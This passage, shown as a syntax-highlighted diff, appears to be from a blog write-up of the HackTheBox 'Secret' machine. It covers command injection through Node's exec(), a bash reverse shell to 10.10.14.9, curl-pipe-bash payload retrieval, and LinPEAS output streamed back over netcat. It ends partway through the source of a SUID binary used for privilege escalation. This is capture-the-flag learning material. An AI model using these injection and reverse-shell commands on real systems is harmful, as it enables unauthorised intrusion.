+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getLogs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`git log --oneline &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getLogs&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; , &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt;) =&amp;gt;{
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;){
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;);
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;stage-2-remote-code-execution-to-reverse-shell&#34;&gt;Stage 2: Remote Code &lt;em&gt;Exec()ution&lt;/em&gt; to reverse shell&lt;/h3&gt;
+&lt;p&gt;Regarding the prior snippet, &lt;code&gt;exec()&lt;/code&gt; takes a query parameter, &lt;code&gt;file&lt;/code&gt;, from the HTTP request as its input without being sanitized or filtered; thus allows arbitrary code execution on the remote server. In case some of you may not be familiar with &lt;em&gt;&lt;a href=&#34;https://nodejs.org/dist/latest-v6.x/docs/api/child_process.html#child_process_child_process_exec_command_options_callback&#34;&gt;exec&lt;/a&gt;&lt;/em&gt;, the function basically executes the inputted buffer as a chain of commands separated by semi-colons on its hosting system.&lt;/p&gt;
+&lt;p&gt;The viability of the RCE is then to be tested with basic commands, it is also necessary to check for any infamous utilities capable of spawning a reverse shell, like &lt;em&gt;netcat&lt;/em&gt;, &lt;em&gt;curl&lt;/em&gt;, &lt;em&gt;awk&lt;/em&gt; and so on.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; URL encoding is mandatory to perform complex input with special characters (spaces, dashes, etc.).&lt;/em&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Prints CURL&#39;s version
+file=-;curl --version
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-08_13-19.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After guaranteeing that our code is fully functional, let us connect to the remote machine via a simple reverse shell.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Create a reverse shell script and save it under ./www/rs.sh&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash&lt;/span&gt;
+bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.9/9001 0&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 10.10.14.9 is my current HTB ip&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Hosting the ./www directory, locally&lt;/span&gt;
+$ cd ./www
+$ python3 -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;8088&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Simultaneously, start our listener on port 9001 in another session&lt;/span&gt;
+$ rlwrap -cAr nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;9001&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Send the RCE payload to the server&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# -;curl http://10.10.14.9:8088/rs.sh | bash&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we get ourselves a shell on the server, navigate to &lt;code&gt;$HOME&lt;/code&gt; and read the user&amp;rsquo;s flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-08_14-41.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;stage-3-privilege-escalation&#34;&gt;Stage 3: Privilege Escalation&lt;/h3&gt;
+&lt;p&gt;In this final stage, I would want to use &lt;a href=&#34;https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&#34;&gt;LinPEAS&lt;/a&gt;, one of my favorite enumeration tools, to aid us in gaining a better understanding of the target system. You can either inspect the output on-the-fly or stream it back to your machine for a more convenient examination.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On victim&amp;#39;s machine&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# This line will run LinPEAS in memory and stream the output to us.&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Remember to change the IP according to yours.&lt;/span&gt;
+$ curl http://10.10.14.9:8088/linpeas.sh | bash | nc 10.10.14.9 &lt;span style=&#34;color:#ae81ff&#34;&gt;9002&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# On our end&lt;/span&gt;
+$ nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;9002&lt;/span&gt; | tee linpeas.output
+$ cat linpeas.output
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A lot of noises notwithstanding, LinPEAS does find &lt;code&gt;/opt/count&lt;/code&gt;, an intriguing binary with SUID bit&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-09_10-26.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;and its provided source code.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# /opt/code.c
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;dirent.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/prctl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;linux/limits.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dircount&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;path, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;summary)
+{
+    DIR &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;dir;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; fullpath[PATH_MAX];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; dirent &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ent;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; stat fstat;
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; tot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, regular_files &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, directories &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, symlinks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;((dir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; opendir(path)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+    {
+        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Unable to open directory.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+        exit(EXIT_FAILURE);
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((ent &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; readdir(dir)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL)
+    {
+        &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;tot;
+        strncpy(fullpath, path, PATH_MAX&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;NAME_MAX&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+        strcat(fullpath, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;);
+        strncat(fullpath, ent&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;d_name, strlen(ent&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;d_name));
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;lstat(fullpath, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;fstat))
+        {
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(S_ISDIR(fstat.st_mode))
+            {
+                printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;);
+                &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;directories;
+            }
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(S_ISLNK(fstat.st_mode))
+            {
+                printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;l&amp;#34;&lt;/span&gt;);
+                &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;symlinks;
+            }
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(S_ISREG(fstat.st_mode))
+            {
+                printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+                &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;regular_files;
+            }
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;);
+            printf((fstat.st_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; S_IRUSR) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+            printf((fstat.st_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; S_IWUSR) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+            printf((fstat.st_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; S_IXUSR) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+            printf((fstat.st_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; S_IRGRP) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+            printf((fstat.st_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; S_IWGRP) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+            printf((fstat.st_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; S_IXGRP) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+            printf((fstat.st_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; S_IROTH) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+            printf((fstat.st_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; S_IWOTH) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+            printf((fstat.st_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; S_IXOTH) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;);
+        }
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+        {
+            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;??????????&amp;#34;&lt;/span&gt;);
+        }
+        printf (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, ent&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;d_name);
+    }
+    closedir(dir);
+
+    snprintf(summary, &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Total entries       = %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Regular files       = %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Directories         = %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Symbolic links      = %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, tot, regular_files, directories, symlinks);
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&amp;#34;&lt;/span&gt;, summary);
+}
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;filecount&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;path, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;summary)
+{
+    FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;file;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; ch;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; characters, words, lines;
+
+    file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(path, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (file &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+    {
+        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Unable to open file.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please check if file exists and you have read privilege.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+        exit(EXIT_FAILURE);
+    }
+
+    characters &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; words &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lines &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((ch &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fgetc(file)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; EOF)
+    {
+        characters&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (ch &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; ch &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;)
+            lines&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (ch &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; ch &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\t&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; ch &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; ch &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;)
+            words&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
+    }
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (characters &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+    {
+        words&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
+        lines&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
+    }
+
+    snprintf(summary, &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Total characters = %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Total words      = %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Total lines      = %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, characters, words, lines);
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&amp;#34;&lt;/span&gt;, summary);
+}
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; path[&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; res;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; stat path_s;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; summary[&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;];
+
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter source file/directory name: &amp;#34;&lt;/span&gt;);
+    scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%99s&amp;#34;&lt;/span&gt;, path);
+    getchar();
+    stat(path, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;path_s);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(S_ISDIR(path_s.st_mode))
+        dircount(path, summary);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+        filecount(path, summary);
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// drop privs to limit file write
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    setuid(getuid());
+    &lt;span style=&#34;color:#75715e&#34;&gt;// Enable coredump generation
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    prctl(PR_SET_DUMPABLE, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Save results a file? [y/N]: &amp;#34;&lt;/span&gt;);
+    res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getchar();
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (res &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;) {
+        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Path: &amp;#34;&lt;/span&gt;);
+        scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%99s&amp;#34;&lt;/span&gt;, path);
